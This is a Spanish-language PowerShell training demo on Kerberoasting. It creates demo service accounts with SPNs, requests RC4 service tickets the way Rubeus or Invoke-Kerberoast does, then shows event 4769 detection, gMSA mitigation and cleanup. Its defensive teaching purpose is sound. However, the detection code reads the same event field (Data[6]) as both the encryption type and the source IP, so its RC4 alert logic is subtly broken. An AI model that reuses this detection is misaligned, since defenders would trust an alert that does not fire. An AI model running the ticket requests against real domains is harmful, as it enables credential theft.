# ============================================================
#  DEMO — Kerberoasting
#  Crea cuentas de servicio con SPN y solicita TGS con RC4
#  Ejecutar en: DC o equipo unido al dominio (como admin)
#  Resultado visible: Visor de Eventos > Seguridad > 4769
# ============================================================
# INSTRUCCIONES PARA EL FORMADOR:
#   1. Ajusta $Dominio y $OUDemo
#   2. Ejecuta Setup-CuentasServicio (crea las cuentas con SPN)
#   3. Ejecuta Start-SimulacionKerberoasting (solicita TGS RC4)
#   4. Ejecuta Show-ResultadoKerberoasting (muestra eventos 4769)
#   5. Explica por qué RC4 es la señal de alerta
#   6. Cleanup al terminar
# ============================================================

$Dominio  = "contoso.com"              # <-- ajusta
$OUDemo   = "OU=Demo,DC=contoso,DC=com" # <-- ajusta
$DCHost   = "DC01"                     # <-- nombre de tu DC

# Cuentas de servicio ficticias con SPN (candidatas a Kerberoasting)
$CuentasServicio = @(
    @{ Nombre = "svc-sql-demo";    SPN = "MSSQLSvc/$DCHost.$Dominio`:1433" },
    @{ Nombre = "svc-iis-demo";    SPN = "HTTP/$DCHost.$Dominio"           },
    @{ Nombre = "svc-backup-demo"; SPN = "BackupSvc/$DCHost.$Dominio"      },
    @{ Nombre = "svc-app-demo";    SPN = "AppSvc/$DCHost.$Dominio`:8080"   }
)

$ContrasenaServicio = "Svc@Demo2024!"  # contraseña real de las cuentas

function Setup-CuentasServicio {
    Write-Host "`n[SETUP] Creando cuentas de servicio con SPN..." -ForegroundColor Cyan

    # Crear OU si no existe
    try {
        Get-ADOrganizationalUnit -Identity $OUDemo -ErrorAction Stop | Out-Null
    } catch {
        New-ADOrganizationalUnit -Name "Demo" -Path ($OUDemo -replace "^OU=Demo,","") `
            -ProtectedFromAccidentalDeletion $false
        Write-Host "  OU creada: $OUDemo" -ForegroundColor Green
    }

    $SecPass = ConvertTo-SecureString $ContrasenaServicio -AsPlainText -Force

    foreach ($svc in $CuentasServicio) {
        try {
            Get-ADUser -Identity $svc.Nombre -ErrorAction Stop | Out-Null
            Write-Host "  Ya existe: $($svc.Nombre)" -ForegroundColor Yellow
        } catch {
            # Crear cuenta de servicio
            New-ADUser -Name $svc.Nombre `
                       -SamAccountName $svc.Nombre `
                       -UserPrincipalName "$($svc.Nombre)@$Dominio" `
                       -Path $OUDemo `
                       -AccountPassword $SecPass `
                       -Enabled $true `
                       -PasswordNeverExpires $true `
                       -Description "Cuenta demo Kerberoasting — formacion"

            # Registrar el SPN en la cuenta
            Set-ADUser -Identity $svc.Nombre -ServicePrincipalNames @{Add = $svc.SPN}

            Write-Host "  Creada: $($svc.Nombre) con SPN: $($svc.SPN)" -ForegroundColor Green
        }
    }

    Write-Host "[SETUP] Cuentas listas. Un atacante las encontraría con:`n" -ForegroundColor Cyan
    Write-Host "  Get-ADUser -Filter { ServicePrincipalName -ne '`$null' } -Properties ServicePrincipalName`n" -ForegroundColor White
}

function Show-SPNsDisponibles {
    # Muestra las cuentas con SPN — lo que vería el atacante en reconocimiento
    Write-Host "`n[RECONOCIMIENTO] Cuentas con SPN en el dominio (objetivo del atacante):`n" -ForegroundColor Yellow

    Get-ADUser -Filter { ServicePrincipalName -ne '$null' } `
               -Properties ServicePrincipalName, PasswordLastSet, PasswordNeverExpires |
        Select-Object SamAccountName,
                      @{N='SPN'; E={ $_.ServicePrincipalName -join "; " }},
                      PasswordLastSet,
                      PasswordNeverExpires |
        Format-Table -AutoSize -Wrap

    Write-Host "  RIESGO: contraseñas antiguas + PasswordNeverExpires = candidatas perfectas para Kerberoasting`n" -ForegroundColor Red
}

function Start-SimulacionKerberoasting {
    # Solicita tickets TGS para cada SPN usando cifrado RC4 (0x17)
    # Esto es exactamente lo que hace Rubeus o Invoke-Kerberoast
    Write-Host "`n[ATAQUE] Solicitando tickets TGS con RC4 para cada SPN..." -ForegroundColor Red

    Add-Type -AssemblyName System.IdentityModel

    foreach ($svc in $CuentasServicio) {
        Write-Host "  Solicitando TGS para: $($svc.SPN)" -ForegroundColor DarkRed
        try {
            # Solicitar ticket TGS — genera Event ID 4769 en el DC
            # El tipo de cifrado RC4 (0x17) es la señal de Kerberoasting
            $token = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken `
                -ArgumentList $svc.SPN
            Write-Host "    TGS obtenido. Ticket en memoria (listo para ataque offline)." -ForegroundColor DarkYellow
        } catch {
            Write-Host "    Error solicitando TGS para $($svc.SPN): $_" -ForegroundColor Gray
        }
        Start-Sleep -Milliseconds 500
    }

    Write-Host "`n[ATAQUE] Simulación completada." -ForegroundColor Red
    Write-Host "  En un ataque real, estos tickets se exportarían y atacarían offline con hashcat." -ForegroundColor Yellow
    Write-Host "  Event ID 4769 generado por cada solicitud.`n" -ForegroundColor Red
}

function Show-ResultadoKerberoasting {
    Write-Host "`n[EVIDENCIA] Solicitudes TGS de los últimos 10 minutos:`n" -ForegroundColor Cyan
    Write-Host "  Vista gráfica: Visor de eventos > Registros de Windows > Seguridad > Filtrar por Event ID 4769`n" -ForegroundColor White

    $eventos = Get-WinEvent -FilterHashtable @{
        LogName   = 'Security'
        Id        = 4769
        StartTime = (Get-Date).AddMinutes(-10)
    } -ErrorAction SilentlyContinue

    if (-not $eventos) {
        Write-Host "  No se encontraron eventos 4769. Verifica auditoría de Kerberos en el DC." -ForegroundColor Yellow
        Write-Host "  Comando: auditpol /set /subcategory:'Kerberos Service Ticket Operations' /success:enable /failure:enable`n"
        return
    }

    $eventos | ForEach-Object {
        $xml = [xml]$_.ToXml()
        $encType = $xml.Event.EventData.Data[6].'#text'
        $esRC4   = $encType -eq "0x17"

        [PSCustomObject]@{
            Hora         = $_.TimeCreated.ToString("HH:mm:ss")
            Cuenta       = $xml.Event.EventData.Data[0].'#text'
            Servicio     = $xml.Event.EventData.Data[2].'#text'
            Cifrado      = if ($esRC4) { "0x17 (RC4) ⚠️ ALERTA" } else { $encType }
            IP_Origen    = $xml.Event.EventData.Data[6].'#text'
        }
    } | Format-Table -AutoSize

    $alertas = $eventos | Where-Object { ([xml]$_.ToXml()).Event.EventData.Data[6].'#text' -eq "0x17" }
    Write-Host "  Total solicitudes TGS  : $($eventos.Count)" -ForegroundColor White
    Write-Host "  Con cifrado RC4 (0x17) : $($alertas.Count)  <-- ESTO ES LO QUE BUSCA EL DEFENSOR" -ForegroundColor Red
    Write-Host "`n  En un entorno moderno con AES, cualquier TGS con RC4 merece investigación.`n" -ForegroundColor Yellow
}

function Show-MitigacionKerberoasting {
    Write-Host "`n[MITIGACIÓN] Detectar y corregir cuentas vulnerables:`n" -ForegroundColor Green

    Write-Host "  1. Cuentas con SPN y contraseña antigua (>180 días):" -ForegroundColor White
    Get-ADUser -Filter { ServicePrincipalName -ne '$null' } `
               -Properties ServicePrincipalName, PasswordLastSet |
        Where-Object { $_.PasswordLastSet -lt (Get-Date).AddDays(-180) } |
        Select-Object SamAccountName, PasswordLastSet |
        Format-Table -AutoSize

    Write-Host "  2. Solución recomendada: reemplazar por gMSA" -ForegroundColor White
    Write-Host @"
     New-ADServiceAccount -Name 'svc-sql-gmsa' ``
         -DNSHostName 'sqlprod.$Dominio' ``
         -PrincipalsAllowedToRetrieveManagedPassword 'ServidoresSQLGrp' ``
         -KerberosEncryptionType AES256

     # La gMSA tiene contraseña de 240 bytes gestionada por el DC.
     # Nadie la conoce. Es inmune a Kerberoasting.
"@ -ForegroundColor Gray
}

function Cleanup-CuentasServicio {
    Write-Host "`n[CLEANUP] Eliminando cuentas de servicio demo..." -ForegroundColor Cyan
    foreach ($svc in $CuentasServicio) {
        try {
            Remove-ADUser -Identity $svc.Nombre -Confirm:$false
            Write-Host "  Eliminada: $($svc.Nombre)" -ForegroundColor Green
        } catch {
            Write-Host "  No encontrada: $($svc.Nombre)" -ForegroundColor Yellow
        }
    }
    try {
        Remove-ADOrganizationalUnit -Identity $OUDemo -Recursive -Confirm:$false
        Write-Host "  OU eliminada." -ForegroundColor Green
    } catch {}
    Write-Host "[CLEANUP] Listo.`n" -ForegroundColor Cyan
}

# ── MENÚ PRINCIPAL ──────────────────────────────────────────
Write-Host @"
╔══════════════════════════════════════════════════╗
║   DEMO: Kerberoasting — Módulo 4                 ║
╠══════════════════════════════════════════════════╣
║  1. Setup-CuentasServicio      (crear SPNs)      ║
║  2. Show-SPNsDisponibles       (reconocimiento)  ║
║  3. Start-SimulacionKerberoasting                ║
║  4. Show-ResultadoKerberoasting (eventos 4769)   ║
║  5. Show-MitigacionKerberoasting (gMSA)          ║
║  6. Cleanup-CuentasServicio                      ║
║  0. Salir                                        ║
╚══════════════════════════════════════════════════╝
"@ -ForegroundColor Cyan

Write-Host "Flujo recomendado: 1 -> 2 -> 3 -> 4 -> 5 -> 6`n" -ForegroundColor White

do {
    $opcion = Read-Host "Selecciona una opción"
    switch ($opcion) {
        "1" { Setup-CuentasServicio }
        "2" { Show-SPNsDisponibles }
        "3" { Start-SimulacionKerberoasting }
        "4" { Show-ResultadoKerberoasting }
        "5" { Show-MitigacionKerberoasting }
        "6" { Cleanup-CuentasServicio }
        "0" { Write-Host "Saliendo..." -ForegroundColor Gray }
        default { Write-Host "Opción no válida. Elige un número del 0 al 6." -ForegroundColor Yellow }
    }
} until ($opcion -eq "0")
